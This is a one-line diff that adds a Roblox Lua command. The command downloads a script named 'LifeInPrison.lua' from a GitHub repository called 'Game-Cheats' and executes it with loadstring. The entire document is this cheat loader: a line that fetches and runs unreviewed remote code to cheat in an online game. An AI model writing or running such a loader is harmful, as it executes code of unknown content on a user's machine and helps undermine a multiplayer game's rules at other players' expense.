@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ValentinDev-Xp/Game-Cheats/main/LifeInPrison.lua'))()
